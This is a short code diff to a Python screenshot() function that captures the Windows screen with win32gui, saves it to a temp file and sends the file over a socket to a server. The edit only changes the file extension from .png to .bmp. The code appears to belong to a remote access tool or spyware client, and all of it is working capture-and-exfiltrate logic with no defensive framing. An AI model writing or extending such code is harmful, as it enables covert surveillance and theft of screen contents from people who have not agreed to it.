@@ -114,14 +114,14 @@ def screenshot():
     memory_device_context.BitBlt((0, 0), (arrScr[0], arrScr[1]), img_device_context, (arrScr[2], arrScr[3]), win32con.SRCCOPY)
 
     # save screenshot and free objects
-    screenshot.SaveBitmapFile(memory_device_context, TMP + "/s.png")
+    screenshot.SaveBitmapFile(memory_device_context, TMP + "/s.bmp")
     memory_device_context.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
 
     # send screenshot information to server
-    objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
+    objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.bmp"))
                               + " bytes" + "\n" + "Please wait..."))
-    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
+    objPic = open(TMP + "/s.bmp", "rb")  # send file contents and close the file
     time.sleep(1)
     objSocket.send(objPic.read())
     objPic.close()
